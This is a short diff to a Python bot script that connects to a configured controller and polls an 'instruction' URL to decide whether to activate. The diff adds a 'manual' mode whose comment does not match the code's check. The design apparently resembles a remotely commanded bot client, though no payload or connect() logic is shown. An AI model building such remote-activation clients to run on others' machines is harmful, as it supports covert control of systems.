@@ -8,9 +8,13 @@ host = '127.0.0.1'		# Put controller IP here
 port = 8080				# Put controller listening port here
 connections = {
 	'source':'',		# Put URL for update here. Leave blank for manual only.
-	'instruction':''	# Put url for currently active device here.
+	'instruction':''	# Put url for currently active device here. if source is set to 'manual', the bot will automatially start.
 }
-ACTIVE = ( urllib.request.urlopen(connections['instruction']).read() == botname ) # finds if instruction matches current bot
+
+if connections['instruction'] == 'manual':
+	ACTIVE = 'manual'
+else:
+	ACTIVE = ( urllib.request.urlopen(connections['instruction']).read() == botname ) # finds if instruction matches current bot
 
 # connection ============================================= #
 def connect():
@@ -42,5 +46,5 @@ while True: # Tests for instruction every 10 seconds.
 		ACTIVE = ( urllib.request.urlopen(connections['instruction']).read() == botname )
 		time.sleep(10)
 		continue
-	else:
+	elif ( ACTIVE == True ) or ( ACTIVE == 'manual' ):
 		connect()
